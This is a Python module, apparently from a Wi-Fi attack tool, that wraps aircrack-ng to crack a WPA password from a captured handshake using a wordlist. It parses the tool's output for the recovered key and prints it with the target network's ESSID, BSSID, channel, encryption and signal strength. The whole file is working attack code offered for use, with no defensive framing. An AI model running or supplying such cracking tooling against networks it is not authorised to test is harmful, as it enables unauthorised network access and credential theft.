import os
import re
import threading
import time
from utils import colored_log, Colors, execute_command, loading_spinner


def crack_password(handshake_path: str, wordlist_path: str, network) -> str | None:
    """Crack password from handshake with loading animation and display network details"""
    if not os.path.exists(handshake_path) or not os.path.exists(wordlist_path):
        colored_log("error", "Handshake file or wordlist not found")
        return None

    colored_log("info", f"Using wordlist: {wordlist_path}")

    # Start loading animation
    stop_event = threading.Event()
    animation_thread = threading.Thread(
        target=loading_spinner,
        args=(stop_event, "Cracking password"),
    )
    animation_thread.daemon = True
    animation_thread.start()

    # Measure cracking time
    start_time = time.time()

    # Use aircrack-ng for cracking
    result = execute_command(["aircrack-ng", "-w", wordlist_path, handshake_path])

    # Stop animation after cracking is done
    stop_event.set()
    animation_thread.join()

    if not result:
        colored_log("error", "Error cracking password!")
        return None

    # Check results
    if "KEY FOUND!" in result.stdout:
        match = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", result.stdout)
        if match:
            password = match.group(1)
            elapsed_time = time.time() - start_time
            minutes, seconds = divmod(int(elapsed_time), 60)
            time_str = f"{minutes:02d}:{seconds:02d}"

            # Display detailed success message
            colored_log(
                "success",
                f"Password found for {network.essid} ({network.bssid}): {Colors.BOLD}{password}{Colors.ENDC}",
            )
            print(f"{Colors.GREEN}  - Channel: {network.channel}{Colors.ENDC}")
            print(f"{Colors.GREEN}  - Encryption: {network.encryption}{Colors.ENDC}")
            print(f"{Colors.GREEN}  - Power: {network.power} dBm{Colors.ENDC}")
            print(f"{Colors.GREEN}  - Time taken: {time_str}{Colors.ENDC}")
            return password

    colored_log("error", "Password not found in wordlist! Better luck next time :)")
    return None
